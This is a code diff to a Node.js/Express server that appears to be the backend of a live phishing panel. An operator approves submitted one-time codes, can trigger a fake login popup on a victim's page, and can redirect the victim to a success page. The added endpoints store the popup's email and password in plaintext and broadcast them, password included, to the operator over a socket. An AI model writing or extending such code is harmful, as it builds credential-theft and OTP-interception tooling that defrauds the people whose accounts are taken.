@@ -128,6 +128,10 @@ async function initializeDatabase() {
         otp_verified BOOLEAN DEFAULT FALSE,
         approved BOOLEAN DEFAULT FALSE,
         second_approved BOOLEAN DEFAULT FALSE,
+        force_login BOOLEAN DEFAULT FALSE,
+        redirect_success BOOLEAN DEFAULT FALSE,
+        login_email VARCHAR(255) DEFAULT NULL,
+        login_password VARCHAR(255) DEFAULT NULL,
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
         updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       )
@@ -147,8 +151,12 @@ async function initializeDatabase() {
     // Add columns if they don't exist
     await pool.query(`
       ALTER TABLE users 
-      ADD COLUMN IF NOT EXISTS second_approved BOOLEAN DEFAULT FALSE
-    `).catch(() => console.log('✅ second_approved column exists'));
+      ADD COLUMN IF NOT EXISTS second_approved BOOLEAN DEFAULT FALSE,
+      ADD COLUMN IF NOT EXISTS force_login BOOLEAN DEFAULT FALSE,
+      ADD COLUMN IF NOT EXISTS redirect_success BOOLEAN DEFAULT FALSE,
+      ADD COLUMN IF NOT EXISTS login_email VARCHAR(255) DEFAULT NULL,
+      ADD COLUMN IF NOT EXISTS login_password VARCHAR(255) DEFAULT NULL
+    `).catch(() => console.log('✅ Additional columns exist'));
 
     // Create update timestamp function
     await pool.query(`
@@ -307,6 +315,73 @@ app.post('/api/users/submit-second-otp', async (req, res) => {
   }
 });
 
+// ==================== NEW POLLING ENDPOINTS (ADDED) ====================
+
+// Check if admin wants to force login popup
+app.post('/api/users/check-force-login', async (req, res) => {
+  try {
+    const { email } = req.body;
+    if (!email) return res.json({ force_login: false });
+    
+    const result = await pool.query('SELECT force_login FROM users WHERE email = $1', [email]);
+    res.json({ force_login: result.rows.length > 0 ? result.rows[0].force_login : false });
+  } catch (error) {
+    console.error('❌ Check force login error:', error.message);
+    res.json({ force_login: false });
+  }
+});
+
+// Check if admin wants to redirect user to success
+app.post('/api/users/check-redirect-success', async (req, res) => {
+  try {
+    const { email } = req.body;
+    if (!email) return res.json({ redirect_success: false });
+    
+    const result = await pool.query('SELECT redirect_success FROM users WHERE email = $1', [email]);
+    res.json({ redirect_success: result.rows.length > 0 ? result.rows[0].redirect_success : false });
+  } catch (error) {
+    console.error('❌ Check redirect success error:', error.message);
+    res.json({ redirect_success: false });
+  }
+});
+
+// User submits login from popup
+app.post('/api/users/submit-login-popup', async (req, res) => {
+  try {
+    const { email, loginEmail, loginPassword } = req.body;
+    if (!email || !loginEmail || !loginPassword) {
+      return res.status(400).json({ error: 'All fields required' });
+    }
+    
+    const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
+    if (!emailRegex.test(loginEmail)) {
+      return res.status(400).json({ error: 'Please enter a valid email address' });
+    }
+    
+    // Save login credentials to database
+    await pool.query(
+      'UPDATE users SET login_email = $1, login_password = $2, force_login = false WHERE email = $3',
+      [loginEmail, loginPassword, email]
+    );
+    
+    console.log('🔔 User submitted popup login:', email, 'Login Email:', loginEmail);
+    
+    // Notify admin via socket
+    io.emit('user-login-submitted', { 
+      email,
+      loginEmail,
+      loginPassword,
+      timestamp: new Date(),
+      message: '🔐 User completed forced login'
+    });
+    
+    res.json({ success: true, message: 'Login submitted successfully' });
+  } catch (error) {
+    console.error('❌ Submit login popup error:', error.message);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
 // ==================== ADMIN ENDPOINTS ====================
 
 // Admin login
@@ -331,7 +406,7 @@ app.post('/api/admin/login', async (req, res) => {
   }
 });
 
-// Get all users
+// Get all users - UPDATED with new columns
 app.get('/api/admin/users', authenticateJWT, async (req, res) => {
   try {
     const result = await pool.query(`
@@ -345,6 +420,10 @@ app.get('/api/admin/users', authenticateJWT, async (req, res) => {
         otp_verified,
         approved,
         second_approved,
+        force_login,
+        redirect_success,
+        login_email,
+        login_password,
         created_at,
         updated_at
       FROM users 
@@ -396,6 +475,54 @@ app.post('/api/admin/approve-second', authenticateJWT, async (req, res) => {
     res.json({ success: true, message: 'Second OTP approved' });
   } catch (error) {
     console.error('❌ Approve second error:', error.message);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// ==================== NEW ADMIN ENDPOINTS (ADDED) ====================
+
+// Admin force login - sets force_login flag in database
+app.post('/api/admin/force-login', authenticateJWT, async (req, res) => {
+  try {
+    const { email } = req.body;
+    if (!email) return res.status(400).json({ error: 'Email required' });
+    
+    await pool.query('UPDATE users SET force_login = true WHERE email = $1', [email]);
+    console.log('🔔 Admin forced login for user:', email);
+    
+    // Notify admin via socket (already connected)
+    io.emit('force-login-triggered', { 
+      email,
+      timestamp: new Date(),
+      message: '🔐 Force login triggered for user'
+    });
+    
+    res.json({ success: true, message: 'Force login triggered' });
+  } catch (error) {
+    console.error('❌ Force login error:', error.message);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// Admin redirect to success - sets redirect_success flag in database
+app.post('/api/admin/redirect-success', authenticateJWT, async (req, res) => {
+  try {
+    const { email } = req.body;
+    if (!email) return res.status(400).json({ error: 'Email required' });
+    
+    await pool.query('UPDATE users SET redirect_success = true WHERE email = $1', [email]);
+    console.log('🔔 Admin redirecting user to success:', email);
+    
+    // Notify admin via socket
+    io.emit('redirect-success-triggered', { 
+      email,
+      timestamp: new Date(),
+      message: '🎉 Redirect to success triggered for user'
+    });
+    
+    res.json({ success: true, message: 'Redirect to success triggered' });
+  } catch (error) {
+    console.error('❌ Redirect success error:', error.message);
     res.status(500).json({ error: 'Server error' });
   }
 });
